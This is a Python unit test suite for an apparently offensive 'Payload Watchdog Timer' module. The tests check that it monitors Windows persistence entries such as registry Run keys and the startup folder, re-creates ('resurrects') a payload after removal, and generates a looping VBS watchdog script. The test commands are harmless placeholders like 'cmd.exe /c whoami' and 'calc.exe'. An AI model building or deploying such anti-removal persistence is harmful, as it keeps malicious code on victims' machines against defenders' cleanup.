#!/usr/bin/env python3
"""
Test suite for Payload Watchdog Timer
Tests all functionality and integration points
"""

import unittest
import time
import threading
from unittest.mock import patch, MagicMock
from payload_watchdog_timer import (
    PayloadWatchdogTimer,
    WatchdogConfig,
    create_watchdog_timer,
)


class TestWatchdogConfig(unittest.TestCase):
    """Test WatchdogConfig class"""

    def test_default_config(self):
        """Test default configuration"""
        config = WatchdogConfig()
        self.assertEqual(config.check_interval, 30)
        self.assertEqual(config.max_restarts, 10)
        self.assertEqual(config.restart_delay, 5)
        self.assertTrue(config.enabled)
        self.assertEqual(len(config.persistence_methods), 5)

    def test_custom_config(self):
        """Test custom configuration"""
        config = WatchdogConfig(
            check_interval=60,
            max_restarts=20,
            restart_delay=10,
            enabled=False,
        )
        self.assertEqual(config.check_interval, 60)
        self.assertEqual(config.max_restarts, 20)
        self.assertEqual(config.restart_delay, 10)
        self.assertFalse(config.enabled)

    def test_custom_persistence_methods(self):
        """Test custom persistence methods"""
        methods = ["registry_hkcu", "startup_folder"]
        config = WatchdogConfig(persistence_methods=methods)
        self.assertEqual(config.persistence_methods, methods)


class TestPayloadWatchdogTimer(unittest.TestCase):
    """Test PayloadWatchdogTimer class"""

    def setUp(self):
        """Set up test fixtures"""
        self.test_command = "cmd.exe /c whoami"
        self.watchdog = create_watchdog_timer(self.test_command)

    def tearDown(self):
        """Clean up"""
        if self.watchdog.is_running:
            self.watchdog.stop()

    def test_initialization(self):
        """Test watchdog initialization"""
        self.assertEqual(self.watchdog.payload_command, self.test_command)
        self.assertFalse(self.watchdog.is_running)
        self.assertEqual(self.watchdog.restart_count, 0)
        self.assertIsNotNone(self.watchdog.config)

    def test_start_and_stop(self):
        """Test start and stop operations"""
        self.assertFalse(self.watchdog.is_running)

        self.watchdog.start()
        time.sleep(0.5)
        self.assertTrue(self.watchdog.is_running)
        self.assertIsNotNone(self.watchdog.monitor_thread)

        self.watchdog.stop()
        time.sleep(0.5)
        self.assertFalse(self.watchdog.is_running)

    def test_double_start(self):
        """Test starting already running watchdog"""
        self.watchdog.start()
        time.sleep(0.5)

        # Try to start again (should be ignored)
        self.watchdog.start()
        self.assertTrue(self.watchdog.is_running)

        self.watchdog.stop()

    def test_double_stop(self):
        """Test stopping already stopped watchdog"""
        self.watchdog.start()
        time.sleep(0.5)
        self.watchdog.stop()
        time.sleep(0.5)

        # Try to stop again (should be ignored)
        self.watchdog.stop()
        self.assertFalse(self.watchdog.is_running)

    def test_get_status(self):
        """Test status retrieval"""
        status = self.watchdog.get_status()

        self.assertIn('running', status)
        self.assertIn('uptime_seconds', status)
        self.assertIn('restart_count', status)
        self.assertIn('total_checks', status)
        self.assertIn('detections', status)
        self.assertIn('resurrections', status)
        self.assertIn('failures', status)
        self.assertIn('payload_command', status)

    def test_status_updates_on_running(self):
        """Test status updates while running"""
        self.watchdog.start()
        time.sleep(1.5)

        status1 = self.watchdog.get_status()
        self.assertTrue(status1['running'])
        self.assertGreater(status1['uptime_seconds'], 0)
        self.assertGreater(status1['total_checks'], 0)

        time.sleep(1)

        status2 = self.watchdog.get_status()
        self.assertGreaterEqual(status2['uptime_seconds'], status1['uptime_seconds'])
        self.assertGreaterEqual(status2['total_checks'], status1['total_checks'])

        self.watchdog.stop()

    def test_callback_registration(self):
        """Test callback registration"""
        callback = MagicMock()

        self.watchdog.register_callback('on_start', callback)
        self.assertIn(callback, self.watchdog.callbacks['on_start'])

    def test_callback_on_start(self):
        """Test on_start callback"""
        callback = MagicMock()
        self.watchdog.register_callback('on_start', callback)

        self.watchdog.start()
        time.sleep(0.5)
        self.watchdog.stop()

        callback.assert_called()

    def test_callback_on_stop(self):
        """Test on_stop callback"""
        callback = MagicMock()
        self.watchdog.register_callback('on_stop', callback)

        self.watchdog.start()
        time.sleep(0.5)
        self.watchdog.stop()

        callback.assert_called()

    def test_callback_on_check(self):
        """Test on_check callback"""
        callback = MagicMock()
        self.watchdog.register_callback('on_check', callback)
        self.watchdog.config.check_interval = 1  # Faster checks for testing

        self.watchdog.start()
        time.sleep(2.5)  # Wait for at least 2 checks
        self.watchdog.stop()

        self.assertGreater(callback.call_count, 0)

    def test_persistence_state_tracking(self):
        """Test persistence state tracking"""
        for method in self.watchdog.config.persistence_methods:
            self.assertIn(method, self.watchdog.persistence_state)
            self.assertFalse(self.watchdog.persistence_state[method]['exists'])

    def test_statistics_initialization(self):
        """Test statistics initialization"""
        self.assertEqual(self.watchdog.stats['total_checks'], 0)
        self.assertEqual(self.watchdog.stats['detections'], 0)
        self.assertEqual(self.watchdog.stats['resurrections'], 0)
        self.assertEqual(self.watchdog.stats['failures'], 0)

    def test_statistics_update(self):
        """Test statistics update during monitoring"""
        self.watchdog.config.check_interval = 1
        self.watchdog.start()
        time.sleep(1.5)

        status = self.watchdog.get_status()
        self.assertGreater(status['total_checks'], 0)

        self.watchdog.stop()

    def test_restart_count_increments(self):
        """Test restart count incrementation"""
        initial_count = self.watchdog.restart_count
        self.watchdog._resurrect_payload(['registry_hkcu'])
        self.assertGreater(self.watchdog.restart_count, initial_count)

    def test_vbs_watchdog_code_generation(self):
        """Test VBS watchdog code generation"""
        vbs_code = self.watchdog.get_vbs_watchdog_code()

        self.assertIsInstance(vbs_code, str)
        self.assertGreater(len(vbs_code), 100)
        self.assertIn("Payload Watchdog", vbs_code)
        self.assertIn(self.test_command, vbs_code)
        self.assertIn("Do", vbs_code)
        self.assertIn("Loop", vbs_code)

    def test_vbs_code_contains_configuration(self):
        """Test VBS code contains watchdog configuration"""
        vbs_code = self.watchdog.get_vbs_watchdog_code()

        self.assertIn(str(self.watchdog.config.check_interval), vbs_code)
        self.assertIn(str(self.watchdog.config.max_restarts), vbs_code)
        self.assertIn(str(self.watchdog.config.restart_delay), vbs_code)

    def test_multiple_callbacks_same_event(self):
        """Test multiple callbacks for same event"""
        callback1 = MagicMock()
        callback2 = MagicMock()

        self.watchdog.register_callback('on_start', callback1)
        self.watchdog.register_callback('on_start', callback2)

        self.watchdog.start()
        time.sleep(0.5)
        self.watchdog.stop()

        callback1.assert_called()
        callback2.assert_called()

    def test_exception_in_callback(self):
        """Test exception handling in callback"""
        def bad_callback():
            raise ValueError("Test error")

        self.watchdog.register_callback('on_start', bad_callback)

        # Should not raise, should log error
        self.watchdog.start()
        time.sleep(0.5)
        self.watchdog.stop()

    def test_thread_safety(self):
        """Test thread safety"""
        statuses = []

        def get_status_loop():
            for _ in range(10):
                status = self.watchdog.get_status()
                statuses.append(status)
                time.sleep(0.01)

        self.watchdog.start()

        threads = [
            threading.Thread(target=get_status_loop),
            threading.Thread(target=get_status_loop),
            threading.Thread(target=get_status_loop),
        ]

        for t in threads:
            t.start()

        for t in threads:
            t.join()

        self.watchdog.stop()

        self.assertGreater(len(statuses), 0)

    def test_factory_function(self):
        """Test factory function"""
        watchdog = create_watchdog_timer(
            "calc.exe",
            check_interval=60,
            max_restarts=5,
        )

        self.assertEqual(watchdog.payload_command, "calc.exe")
        self.assertEqual(watchdog.config.check_interval, 60)
        self.assertEqual(watchdog.config.max_restarts, 5)


class TestWatchdogIntegration(unittest.TestCase):
    """Integration tests for watchdog"""

    def test_full_lifecycle(self):
        """Test complete watchdog lifecycle"""
        watchdog = create_watchdog_timer("cmd.exe /c echo test")

        # Start
        watchdog.start()
        time.sleep(1)
        self.assertTrue(watchdog.is_running)

        # Get status
        status = watchdog.get_status()
        self.assertTrue(status['running'])
        self.assertGreater(status['uptime_seconds'], 0)

        # Stop
        watchdog.stop()
        time.sleep(0.5)
        self.assertFalse(watchdog.is_running)

    def test_multiple_watchdogs(self):
        """Test multiple watchdogs running simultaneously"""
        watchdog1 = create_watchdog_timer("cmd.exe /c echo 1")
        watchdog2 = create_watchdog_timer("cmd.exe /c echo 2")
        watchdog3 = create_watchdog_timer("cmd.exe /c echo 3")

        watchdog1.start()
        watchdog2.start()
        watchdog3.start()

        time.sleep(1)

        self.assertTrue(watchdog1.is_running)
        self.assertTrue(watchdog2.is_running)
        self.assertTrue(watchdog3.is_running)

        watchdog1.stop()
        watchdog2.stop()
        watchdog3.stop()

        time.sleep(0.5)

        self.assertFalse(watchdog1.is_running)
        self.assertFalse(watchdog2.is_running)
        self.assertFalse(watchdog3.is_running)

    def test_callback_data_accuracy(self):
        """Test callback data accuracy"""
        collected_data = []

        def on_check(data):
            collected_data.append(data)

        watchdog = create_watchdog_timer("cmd.exe")
        watchdog.config.check_interval = 1
        watchdog.register_callback('on_check', on_check)

        watchdog.start()
        time.sleep(2.5)
        watchdog.stop()

        self.assertGreater(len(collected_data), 0)

        # Verify data structure
        for data in collected_data:
            self.assertIn('checked_methods', data)
            self.assertIn('removed_methods', data)
            self.assertIn('stats', data)
            self.assertIsInstance(data['stats'], dict)

    def test_selective_method_monitoring(self):
        """Test monitoring only specific methods"""
        methods = ["registry_hkcu", "startup_folder"]
        watchdog = create_watchdog_timer(
            "cmd.exe",
            persistence_methods=methods
        )

        self.assertEqual(len(watchdog.config.persistence_methods), 2)
        self.assertEqual(watchdog.config.persistence_methods, methods)


class TestWatchdogPerformance(unittest.TestCase):
    """Performance tests"""

    def test_startup_time(self):
        """Test watchdog startup time"""
        watchdog = create_watchdog_timer("cmd.exe")

        start = time.time()
        watchdog.start()
        elapsed = time.time() - start

        watchdog.stop()

        # Should start quickly (< 100ms)
        self.assertLess(elapsed, 0.1)

    def test_status_retrieval_time(self):
        """Test status retrieval performance"""
        watchdog = create_watchdog_timer("cmd.exe")
        watchdog.start()
        time.sleep(0.5)

        start = time.time()
        for _ in range(100):
            watchdog.get_status()
        elapsed = time.time() - start

        watchdog.stop()

        # Should retrieve status quickly (< 1ms each)
        avg_time = elapsed / 100
        self.assertLess(avg_time, 0.01)

    def test_callback_overhead(self):
        """Test callback overhead"""
        def dummy_callback(data=None):
            pass

        watchdog = create_watchdog_timer("cmd.exe")
        watchdog.config.check_interval = 0.1

        # Without callbacks
        watchdog.start()
        time.sleep(0.5)
        status1 = watchdog.get_status()
        watchdog.stop()
        time.sleep(0.2)

        # With callbacks
        watchdog = create_watchdog_timer("cmd.exe")
        watchdog.config.check_interval = 0.1
        for _ in range(10):
            watchdog.register_callback('on_check', dummy_callback)

        watchdog.start()
        time.sleep(0.5)
        status2 = watchdog.get_status()
        watchdog.stop()

        # Both should complete within reasonable time
        self.assertLess(status1['uptime_seconds'], 2)
        self.assertLess(status2['uptime_seconds'], 2)


def run_tests():
    """Run all tests"""
    loader = unittest.TestLoader()
    suite = unittest.TestSuite()

    # Add all test classes
    suite.addTests(loader.loadTestsFromTestCase(TestWatchdogConfig))
    suite.addTests(loader.loadTestsFromTestCase(TestPayloadWatchdogTimer))
    suite.addTests(loader.loadTestsFromTestCase(TestWatchdogIntegration))
    suite.addTests(loader.loadTestsFromTestCase(TestWatchdogPerformance))

    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)

    return result.wasSuccessful()


if __name__ == "__main__":
    success = run_tests()
    exit(0 if success else 1)
